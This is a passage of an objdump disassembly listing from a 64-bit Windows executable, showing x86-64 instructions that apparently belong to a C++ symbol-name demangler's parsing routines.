   140002dce:	e9 a0 f9 ff ff       	jmp    0x140002773
   140002dd3:	8b 43 28             	mov    0x28(%rbx),%eax
   140002dd6:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002dd9:	0f 8d 96 01 02 00    	jge    0x140022f75
   140002ddf:	48 63 c8             	movslq %eax,%rcx
   140002de2:	83 c0 01             	add    $0x1,%eax
   140002de5:	48 c1 e1 05          	shl    $0x5,%rcx
   140002de9:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002ded:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002df4:	00 
   140002df5:	49 89 c9             	mov    %rcx,%r9
   140002df8:	89 43 28             	mov    %eax,0x28(%rbx)
   140002dfb:	48 8d 05 3e 3f 02 00 	lea    0x23f3e(%rip),%rax        # 0x140026d40
   140002e02:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002e08:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002e0c:	83 43 48 0a          	addl   $0xa,0x48(%rbx)
   140002e10:	e9 5e f9 ff ff       	jmp    0x140002773
   140002e15:	8b 43 28             	mov    0x28(%rbx),%eax
   140002e18:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002e1b:	0f 8d 54 01 02 00    	jge    0x140022f75
   140002e21:	48 63 c8             	movslq %eax,%rcx
   140002e24:	83 c0 01             	add    $0x1,%eax
   140002e27:	48 c1 e1 05          	shl    $0x5,%rcx
   140002e2b:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002e2f:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002e36:	00 
   140002e37:	49 89 c9             	mov    %rcx,%r9
   140002e3a:	89 43 28             	mov    %eax,0x28(%rbx)
   140002e3d:	48 8d 05 dc 3e 02 00 	lea    0x23edc(%rip),%rax        # 0x140026d20
   140002e44:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002e4a:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002e4e:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   140002e52:	e9 1c f9 ff ff       	jmp    0x140002773
   140002e57:	8b 43 28             	mov    0x28(%rbx),%eax
   140002e5a:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002e5d:	0f 8d 0d f9 ff ff    	jge    0x140002770
   140002e63:	48 63 c8             	movslq %eax,%rcx
   140002e66:	83 c0 01             	add    $0x1,%eax
   140002e69:	89 43 28             	mov    %eax,0x28(%rbx)
   140002e6c:	48 c1 e1 05          	shl    $0x5,%rcx
   140002e70:	48 8d 05 48 25 02 00 	lea    0x22548(%rip),%rax        # 0x1400253bf
   140002e77:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002e7b:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002e82:	00 
   140002e83:	49 89 c9             	mov    %rcx,%r9
   140002e86:	c7 01 00 00 00 00    	movl   $0x0,(%rcx)
   140002e8c:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002e90:	c7 41 18 04 00 00 00 	movl   $0x4,0x18(%rcx)
   140002e97:	e9 d7 f8 ff ff       	jmp    0x140002773
   140002e9c:	8b 43 28             	mov    0x28(%rbx),%eax
   140002e9f:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002ea2:	0f 8d cd 00 02 00    	jge    0x140022f75
   140002ea8:	48 63 c8             	movslq %eax,%rcx
   140002eab:	83 c0 01             	add    $0x1,%eax
   140002eae:	48 c1 e1 05          	shl    $0x5,%rcx
   140002eb2:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002eb6:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002ebd:	00 
   140002ebe:	49 89 c9             	mov    %rcx,%r9
   140002ec1:	89 43 28             	mov    %eax,0x28(%rbx)
   140002ec4:	48 8d 05 15 3f 02 00 	lea    0x23f15(%rip),%rax        # 0x140026de0
   140002ecb:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002ed1:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002ed5:	83 43 48 11          	addl   $0x11,0x48(%rbx)
   140002ed9:	e9 95 f8 ff ff       	jmp    0x140002773
   140002ede:	8b 43 28             	mov    0x28(%rbx),%eax
   140002ee1:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140002ee4:	0f 8d 8b 00 02 00    	jge    0x140022f75
   140002eea:	48 63 c8             	movslq %eax,%rcx
   140002eed:	83 c0 01             	add    $0x1,%eax
   140002ef0:	48 c1 e1 05          	shl    $0x5,%rcx
   140002ef4:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002ef8:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002eff:	00 
   140002f00:	49 89 c9             	mov    %rcx,%r9
   140002f03:	89 43 28             	mov    %eax,0x28(%rbx)
   140002f06:	48 8d 05 b3 3e 02 00 	lea    0x23eb3(%rip),%rax        # 0x140026dc0
   140002f0d:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002f13:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002f17:	83 43 48 08          	addl   $0x8,0x48(%rbx)
   140002f1b:	e9 53 f8 ff ff       	jmp    0x140002773
   140002f20:	48 89 d9             	mov    %rbx,%rcx
   140002f23:	e8 08 f7 ff ff       	call   0x140002630
   140002f28:	45 31 c9             	xor    %r9d,%r9d
   140002f2b:	ba 4d 00 00 00       	mov    $0x4d,%edx
   140002f30:	48 89 d9             	mov    %rbx,%rcx
   140002f33:	49 89 c0             	mov    %rax,%r8
   140002f36:	e8 05 e6 ff ff       	call   0x140001540
   140002f3b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002f40:	49 89 c0             	mov    %rax,%r8
   140002f43:	e9 a8 f8 ff ff       	jmp    0x1400027f0
   140002f48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002f4f:	00 
   140002f50:	49 83 c0 01          	add    $0x1,%r8
   140002f54:	48 89 d9             	mov    %rbx,%rcx
   140002f57:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140002f5b:	e8 a0 f2 ff ff       	call   0x140002200
   140002f60:	48 89 c6             	mov    %rax,%rsi
   140002f63:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140002f67:	80 38 49             	cmpb   $0x49,(%rax)
   140002f6a:	0f 84 98 00 00 00    	je     0x140003008
   140002f70:	48 89 d9             	mov    %rbx,%rcx
   140002f73:	e8 b8 f6 ff ff       	call   0x140002630
   140002f78:	49 89 f1             	mov    %rsi,%r9
   140002f7b:	ba 22 00 00 00       	mov    $0x22,%edx
   140002f80:	48 89 d9             	mov    %rbx,%rcx
   140002f83:	49 89 c0             	mov    %rax,%r8
   140002f86:	e8 b5 e5 ff ff       	call   0x140001540
   140002f8b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002f90:	49 89 c0             	mov    %rax,%r8
   140002f93:	e9 58 f8 ff ff       	jmp    0x1400027f0
   140002f98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002f9f:	00 
   140002fa0:	83 e8 61             	sub    $0x61,%eax
   140002fa3:	48 8d 15 16 3a 02 00 	lea    0x23a16(%rip),%rdx        # 0x1400269c0
   140002faa:	48 98                	cltq
   140002fac:	48 c1 e0 05          	shl    $0x5,%rax
   140002fb0:	48 01 d0             	add    %rdx,%rax
   140002fb3:	8b 53 28             	mov    0x28(%rbx),%edx
   140002fb6:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   140002fb9:	0f 8d b6 ff 01 00    	jge    0x140022f75
   140002fbf:	48 63 ca             	movslq %edx,%rcx
   140002fc2:	49 83 c0 01          	add    $0x1,%r8
   140002fc6:	83 c2 01             	add    $0x1,%edx
   140002fc9:	48 c1 e1 05          	shl    $0x5,%rcx
   140002fcd:	48 03 4b 20          	add    0x20(%rbx),%rcx
   140002fd1:	48 c7 41 04 00 00 00 	movq   $0x0,0x4(%rcx)
   140002fd8:	00 
   140002fd9:	49 89 c9             	mov    %rcx,%r9
   140002fdc:	89 53 28             	mov    %edx,0x28(%rbx)
   140002fdf:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140002fe3:	8b 40 08             	mov    0x8(%rax),%eax
   140002fe6:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   140002fec:	01 43 48             	add    %eax,0x48(%rbx)
   140002fef:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140002ff3:	e9 7b f7 ff ff       	jmp    0x140002773
   140002ff8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002fff:	00 
   140003000:	45 31 c0             	xor    %r8d,%r8d
   140003003:	e9 9b fa ff ff       	jmp    0x140002aa3
   140003008:	48 83 c0 01          	add    $0x1,%rax
   14000300c:	48 89 d9             	mov    %rbx,%rcx
   14000300f:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003013:	e8 68 19 00 00       	call   0x140004980
   140003018:	49 89 f0             	mov    %rsi,%r8
   14000301b:	ba 04 00 00 00       	mov    $0x4,%edx
   140003020:	48 89 d9             	mov    %rbx,%rcx
   140003023:	49 89 c1             	mov    %rax,%r9
   140003026:	e8 15 e5 ff ff       	call   0x140001540
   14000302b:	48 89 c6             	mov    %rax,%rsi
   14000302e:	e9 3d ff ff ff       	jmp    0x140002f70
   140003033:	8b 53 4c             	mov    0x4c(%rbx),%edx
   140003036:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   14000303d:	48 89 d9             	mov    %rbx,%rcx
   140003040:	89 54 24 28          	mov    %edx,0x28(%rsp)
   140003044:	e8 37 0d 00 00       	call   0x140003d80
   140003049:	8b 54 24 28          	mov    0x28(%rsp),%edx
   14000304d:	49 89 c0             	mov    %rax,%r8
   140003050:	89 53 4c             	mov    %edx,0x4c(%rbx)
   140003053:	48 85 c0             	test   %rax,%rax
   140003056:	0f 84 14 f7 ff ff    	je     0x140002770
   14000305c:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   140003060:	41 0f b6 02          	movzbl (%r10),%eax
   140003064:	e9 2f fa ff ff       	jmp    0x140002a98
   140003069:	48 89 d9             	mov    %rbx,%rcx
   14000306c:	8b 73 28             	mov    0x28(%rbx),%esi
   14000306f:	8b 7b 38             	mov    0x38(%rbx),%edi
   140003072:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003077:	48 8d 42 01          	lea    0x1(%rdx),%rax
   14000307b:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140003080:	44 8b 73 48          	mov    0x48(%rbx),%r14d
   140003084:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003088:	e8 f3 18 00 00       	call   0x140004980
   14000308d:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140003091:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140003096:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   14000309b:	80 39 49             	cmpb   $0x49,(%rcx)
   14000309e:	74 13                	je     0x1400030b3
   1400030a0:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400030a4:	89 73 28             	mov    %esi,0x28(%rbx)
   1400030a7:	89 7b 38             	mov    %edi,0x38(%rbx)
   1400030aa:	44 89 73 48          	mov    %r14d,0x48(%rbx)
   1400030ae:	e9 3d f7 ff ff       	jmp    0x1400027f0
   1400030b3:	4d 85 c0             	test   %r8,%r8
   1400030b6:	0f 84 b4 f6 ff ff    	je     0x140002770
   1400030bc:	8b 53 38             	mov    0x38(%rbx),%edx
   1400030bf:	3b 53 3c             	cmp    0x3c(%rbx),%edx
   1400030c2:	0f 8d a8 f6 ff ff    	jge    0x140002770
   1400030c8:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400030cc:	4c 63 ca             	movslq %edx,%r9
   1400030cf:	83 c2 01             	add    $0x1,%edx
   1400030d2:	4e 89 04 c9          	mov    %r8,(%rcx,%r9,8)
   1400030d6:	49 89 c1             	mov    %rax,%r9
   1400030d9:	89 53 38             	mov    %edx,0x38(%rbx)
   1400030dc:	e9 3a f9 ff ff       	jmp    0x140002a1b
   1400030e1:	83 f8 10             	cmp    $0x10,%eax
   1400030e4:	0f 85 86 f6 ff ff    	jne    0x140002770
   1400030ea:	48 83 c2 01          	add    $0x1,%rdx
   1400030ee:	8b 43 28             	mov    0x28(%rbx),%eax
   1400030f1:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400030f5:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   1400030f8:	0f 8d 77 fe 01 00    	jge    0x140022f75
   1400030fe:	48 63 c8             	movslq %eax,%rcx
   140003101:	45 31 d2             	xor    %r10d,%r10d
   140003104:	83 c0 01             	add    $0x1,%eax
   140003107:	48 c1 e1 05          	shl    $0x5,%rcx
   14000310b:	48 03 4b 20          	add    0x20(%rbx),%rcx
   14000310f:	4c 89 51 04          	mov    %r10,0x4(%rcx)
   140003113:	49 89 c9             	mov    %rcx,%r9
   140003116:	89 43 28             	mov    %eax,0x28(%rbx)
   140003119:	48 8d 05 00 3d 02 00 	lea    0x23d00(%rip),%rax        # 0x140026e20
   140003120:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140003124:	8b 43 48             	mov    0x48(%rbx),%eax
   140003127:	c7 01 28 00 00 00    	movl   $0x28,(%rcx)
   14000312d:	83 c0 0f             	add    $0xf,%eax
   140003130:	e9 b8 fa ff ff       	jmp    0x140002bed
   140003135:	49 83 c0 03          	add    $0x3,%r8
   140003139:	8b 53 4c             	mov    0x4c(%rbx),%edx
   14000313c:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   140003143:	48 89 d9             	mov    %rbx,%rcx
   140003146:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   14000314a:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000314e:	e8 2d 0c 00 00       	call   0x140003d80
   140003153:	8b 54 24 28          	mov    0x28(%rsp),%edx
   140003157:	49 89 c0             	mov    %rax,%r8
   14000315a:	89 53 4c             	mov    %edx,0x4c(%rbx)
   14000315d:	48 85 c0             	test   %rax,%rax
   140003160:	0f 85 21 fb ff ff    	jne    0x140002c87
   140003166:	e9 05 f6 ff ff       	jmp    0x140002770
   14000316b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003170:	41 54                	push   %r12
   140003172:	55                   	push   %rbp
   140003173:	57                   	push   %rdi
   140003174:	56                   	push   %rsi
   140003175:	53                   	push   %rbx
   140003176:	48 83 ec 30          	sub    $0x30,%rsp
   14000317a:	bd 01 00 00 00       	mov    $0x1,%ebp
   14000317f:	48 bf 01 00 80 00 08 	movabs $0x800800001,%rdi
   140003186:	00 00 00 
   140003189:	49 bc 00 00 00 00 12 	movabs $0x1200000000,%r12
   140003190:	00 00 00 
   140003193:	48 89 cb             	mov    %rcx,%rbx
   140003196:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
   14000319b:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   1400031a2:	00 00 
   1400031a4:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400031a8:	0f b6 08             	movzbl (%rax),%ecx
   1400031ab:	84 c9                	test   %cl,%cl
   1400031ad:	74 61                	je     0x140003210
   1400031af:	83 e9 2e             	sub    $0x2e,%ecx
   1400031b2:	80 f9 24             	cmp    $0x24,%cl
   1400031b5:	77 16                	ja     0x1400031cd
   1400031b7:	48 89 ea             	mov    %rbp,%rdx
   1400031ba:	48 d3 e2             	shl    %cl,%rdx
   1400031bd:	48 85 fa             	test   %rdi,%rdx
   1400031c0:	75 4e                	jne    0x140003210
   1400031c2:	4c 85 e2             	test   %r12,%rdx
   1400031c5:	74 06                	je     0x1400031cd
   1400031c7:	80 78 01 45          	cmpb   $0x45,0x1(%rax)
   1400031cb:	74 43                	je     0x140003210
   1400031cd:	48 89 d9             	mov    %rbx,%rcx
   1400031d0:	e8 5b f4 ff ff       	call   0x140002630
   1400031d5:	49 89 c0             	mov    %rax,%r8
   1400031d8:	48 85 c0             	test   %rax,%rax
   1400031db:	74 7b                	je     0x140003258
   1400031dd:	45 31 c9             	xor    %r9d,%r9d
   1400031e0:	ba 2f 00 00 00       	mov    $0x2f,%edx
   1400031e5:	48 89 d9             	mov    %rbx,%rcx
   1400031e8:	e8 53 e3 ff ff       	call   0x140001540
   1400031ed:	48 89 06             	mov    %rax,(%rsi)
   1400031f0:	48 85 c0             	test   %rax,%rax
   1400031f3:	74 63                	je     0x140003258
   1400031f5:	48 8d 70 18          	lea    0x18(%rax),%rsi
   1400031f9:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400031fd:	0f b6 08             	movzbl (%rax),%ecx
   140003200:	84 c9                	test   %cl,%cl
   140003202:	75 ab                	jne    0x1400031af
   140003204:	90                   	nop
   140003205:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000320c:	00 00 00 00 
   140003210:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140003215:	48 85 c0             	test   %rax,%rax
   140003218:	74 3e                	je     0x140003258
   14000321a:	48 83 78 18 00       	cmpq   $0x0,0x18(%rax)
   14000321f:	74 0f                	je     0x140003230
   140003221:	48 83 c4 30          	add    $0x30,%rsp
   140003225:	5b                   	pop    %rbx
   140003226:	5e                   	pop    %rsi
   140003227:	5f                   	pop    %rdi
   140003228:	5d                   	pop    %rbp
   140003229:	41 5c                	pop    %r12
   14000322b:	c3                   	ret
   14000322c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003230:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140003234:	83 3a 28             	cmpl   $0x28,(%rdx)
   140003237:	75 e8                	jne    0x140003221
   140003239:	48 8b 52 10          	mov    0x10(%rdx),%rdx
   14000323d:	83 7a 1c 09          	cmpl   $0x9,0x1c(%rdx)
   140003241:	75 de                	jne    0x140003221
   140003243:	8b 52 08             	mov    0x8(%rdx),%edx
   140003246:	29 53 48             	sub    %edx,0x48(%rbx)
   140003249:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   140003250:	00 
   140003251:	eb ce                	jmp    0x140003221
   140003253:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003258:	31 c0                	xor    %eax,%eax
   14000325a:	48 83 c4 30          	add    $0x30,%rsp
   14000325e:	5b                   	pop    %rbx
   14000325f:	5e                   	pop    %rsi
   140003260:	5f                   	pop    %rdi
   140003261:	5d                   	pop    %rbp
   140003262:	41 5c                	pop    %r12
   140003264:	c3                   	ret
   140003265:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000326c:	00 00 00 00 
   140003270:	56                   	push   %rsi
   140003271:	53                   	push   %rbx
   140003272:	48 83 ec 28          	sub    $0x28,%rsp
   140003276:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000327a:	48 89 cb             	mov    %rcx,%rbx
   14000327d:	80 38 4a             	cmpb   $0x4a,(%rax)
   140003280:	74 5e                	je     0x1400032e0
   140003282:	85 d2                	test   %edx,%edx
   140003284:	74 3a                	je     0x1400032c0
   140003286:	48 89 d9             	mov    %rbx,%rcx
   140003289:	e8 a2 f3 ff ff       	call   0x140002630
   14000328e:	48 89 c6             	mov    %rax,%rsi
   140003291:	48 85 c0             	test   %rax,%rax
   140003294:	74 3c                	je     0x1400032d2
   140003296:	48 89 d9             	mov    %rbx,%rcx
   140003299:	e8 d2 fe ff ff       	call   0x140003170
   14000329e:	49 89 c1             	mov    %rax,%r9
   1400032a1:	48 85 c0             	test   %rax,%rax
   1400032a4:	74 2c                	je     0x1400032d2
   1400032a6:	49 89 f0             	mov    %rsi,%r8
   1400032a9:	ba 2a 00 00 00       	mov    $0x2a,%edx
   1400032ae:	48 89 d9             	mov    %rbx,%rcx
   1400032b1:	48 83 c4 28          	add    $0x28,%rsp
   1400032b5:	5b                   	pop    %rbx
   1400032b6:	5e                   	pop    %rsi
   1400032b7:	e9 84 e2 ff ff       	jmp    0x140001540
   1400032bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400032c0:	48 89 d9             	mov    %rbx,%rcx
   1400032c3:	31 f6                	xor    %esi,%esi
   1400032c5:	e8 a6 fe ff ff       	call   0x140003170
   1400032ca:	49 89 c1             	mov    %rax,%r9
   1400032cd:	48 85 c0             	test   %rax,%rax
   1400032d0:	75 d4                	jne    0x1400032a6
   1400032d2:	31 c0                	xor    %eax,%eax
   1400032d4:	48 83 c4 28          	add    $0x28,%rsp
   1400032d8:	5b                   	pop    %rbx
   1400032d9:	5e                   	pop    %rsi
   1400032da:	c3                   	ret
   1400032db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400032e0:	48 83 c0 01          	add    $0x1,%rax
   1400032e4:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400032e8:	eb 9c                	jmp    0x140003286
   1400032ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400032f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400032f4:	f6 41 12 04          	testb  $0x4,0x12(%rcx)
   1400032f8:	75 2e                	jne    0x140003328
   1400032fa:	44 8b 41 58          	mov    0x58(%rcx),%r8d
   1400032fe:	41 81 f8 00 08 00 00 	cmp    $0x800,%r8d
   140003305:	77 2a                	ja     0x140003331
   140003307:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   14000330b:	41 8d 40 01          	lea    0x1(%r8),%eax
   14000330f:	89 41 58             	mov    %eax,0x58(%rcx)
   140003312:	31 c0                	xor    %eax,%eax
   140003314:	80 3a 46             	cmpb   $0x46,(%rdx)
   140003317:	74 27                	je     0x140003340
   140003319:	44 89 41 58          	mov    %r8d,0x58(%rcx)
   14000331d:	48 83 c4 28          	add    $0x28,%rsp
   140003321:	c3                   	ret
   140003322:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003328:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   14000332c:	80 3a 46             	cmpb   $0x46,(%rdx)
   14000332f:	74 0f                	je     0x140003340
   140003331:	31 c0                	xor    %eax,%eax
   140003333:	48 83 c4 28          	add    $0x28,%rsp
   140003337:	c3                   	ret
   140003338:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000333f:	00 
   140003340:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140003344:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003348:	80 7a 01 59          	cmpb   $0x59,0x1(%rdx)
   14000334c:	75 08                	jne    0x140003356
   14000334e:	48 83 c2 02          	add    $0x2,%rdx
   140003352:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140003356:	ba 01 00 00 00       	mov    $0x1,%edx
   14000335b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003360:	e8 0b ff ff ff       	call   0x140003270
   140003365:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000336a:	48 89 c2             	mov    %rax,%rdx
   14000336d:	e8 8e e4 ff ff       	call   0x140001800
   140003372:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003377:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   14000337b:	80 3a 45             	cmpb   $0x45,(%rdx)
   14000337e:	74 18                	je     0x140003398
   140003380:	31 c0                	xor    %eax,%eax
   140003382:	f6 41 12 04          	testb  $0x4,0x12(%rcx)
   140003386:	75 95                	jne    0x14000331d
   140003388:	8b 51 58             	mov    0x58(%rcx),%edx
   14000338b:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   14000338f:	eb 88                	jmp    0x140003319
   140003391:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003398:	48 83 c2 01          	add    $0x1,%rdx
   14000339c:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   1400033a0:	eb e0                	jmp    0x140003382
   1400033a2:	0f 1f 00             	nopl   (%rax)
   1400033a5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400033ac:	00 00 00 00 
   1400033b0:	48 83 ec 38          	sub    $0x38,%rsp
   1400033b4:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400033b8:	49 89 d1             	mov    %rdx,%r9
   1400033bb:	80 38 54             	cmpb   $0x54,(%rax)
   1400033be:	75 57                	jne    0x140003417
   1400033c0:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   1400033c4:	80 fa 74             	cmp    $0x74,%dl
   1400033c7:	0f 84 bb 00 00 00    	je     0x140003488
   1400033cd:	7f 51                	jg     0x140003420
   1400033cf:	80 fa 6e             	cmp    $0x6e,%dl
   1400033d2:	74 74                	je     0x140003448
   1400033d4:	80 fa 70             	cmp    $0x70,%dl
   1400033d7:	75 3e                	jne    0x140003417
   1400033d9:	48 83 c0 02          	add    $0x2,%rax
   1400033dd:	4c 89 ca             	mov    %r9,%rdx
   1400033e0:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   1400033e5:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400033e9:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400033ee:	e8 bd ff ff ff       	call   0x1400033b0
   1400033f3:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400033f8:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   1400033fd:	ba 5d 00 00 00       	mov    $0x5d,%edx
   140003402:	48 85 c0             	test   %rax,%rax
   140003405:	49 89 c0             	mov    %rax,%r8
   140003408:	75 2b                	jne    0x140003435
   14000340a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003410:	41 c7 01 01 00 00 00 	movl   $0x1,(%r9)
   140003417:	31 c0                	xor    %eax,%eax
   140003419:	48 83 c4 38          	add    $0x38,%rsp
   14000341d:	c3                   	ret
   14000341e:	66 90                	xchg   %ax,%ax
   140003420:	80 fa 79             	cmp    $0x79,%dl
   140003423:	75 f2                	jne    0x140003417
   140003425:	48 83 c0 02          	add    $0x2,%rax
   140003429:	ba 5a 00 00 00       	mov    $0x5a,%edx
   14000342e:	45 31 c0             	xor    %r8d,%r8d
   140003431:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003435:	45 31 c9             	xor    %r9d,%r9d
   140003438:	48 83 c4 38          	add    $0x38,%rsp
   14000343c:	e9 ff e0 ff ff       	jmp    0x140001540
   140003441:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003448:	48 83 c0 02          	add    $0x2,%rax
   14000344c:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003451:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003455:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000345a:	e8 d1 f1 ff ff       	call   0x140002630
   14000345f:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   140003464:	48 85 c0             	test   %rax,%rax
   140003467:	49 89 c0             	mov    %rax,%r8
   14000346a:	74 a4                	je     0x140003410
   14000346c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003471:	ba 5b 00 00 00       	mov    $0x5b,%edx
   140003476:	45 31 c9             	xor    %r9d,%r9d
   140003479:	48 83 c4 38          	add    $0x38,%rsp
   14000347d:	e9 be e0 ff ff       	jmp    0x140001540
   140003482:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003488:	48 83 c0 02          	add    $0x2,%rax
   14000348c:	4c 89 ca             	mov    %r9,%rdx
   14000348f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003494:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003498:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000349d:	e8 3e 00 00 00       	call   0x1400034e0
   1400034a2:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400034a7:	48 85 c0             	test   %rax,%rax
   1400034aa:	49 89 c0             	mov    %rax,%r8
   1400034ad:	0f 84 5d ff ff ff    	je     0x140003410
   1400034b3:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400034b8:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400034bc:	80 38 45             	cmpb   $0x45,(%rax)
   1400034bf:	0f 85 4b ff ff ff    	jne    0x140003410
   1400034c5:	48 83 c0 01          	add    $0x1,%rax
   1400034c9:	ba 5c 00 00 00       	mov    $0x5c,%edx
   1400034ce:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400034d2:	e9 5e ff ff ff       	jmp    0x140003435
   1400034d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400034de:	00 00 
   1400034e0:	57                   	push   %rdi
   1400034e1:	56                   	push   %rsi
   1400034e2:	53                   	push   %rbx
   1400034e3:	48 83 ec 30          	sub    $0x30,%rsp
   1400034e7:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   1400034ee:	00 00 
   1400034f0:	48 89 ce             	mov    %rcx,%rsi
   1400034f3:	48 89 d7             	mov    %rdx,%rdi
   1400034f6:	48 8d 5c 24 28       	lea    0x28(%rsp),%rbx
   1400034fb:	eb 0a                	jmp    0x140003507
   1400034fd:	0f 1f 00             	nopl   (%rax)
   140003500:	48 89 03             	mov    %rax,(%rbx)
   140003503:	48 8d 58 18          	lea    0x18(%rax),%rbx
   140003507:	48 89 fa             	mov    %rdi,%rdx
   14000350a:	48 89 f1             	mov    %rsi,%rcx
   14000350d:	e8 9e fe ff ff       	call   0x1400033b0
   140003512:	48 85 c0             	test   %rax,%rax
   140003515:	75 e9                	jne    0x140003500
   140003517:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   14000351c:	4d 85 c0             	test   %r8,%r8
   14000351f:	74 1f                	je     0x140003540
   140003521:	45 31 c9             	xor    %r9d,%r9d
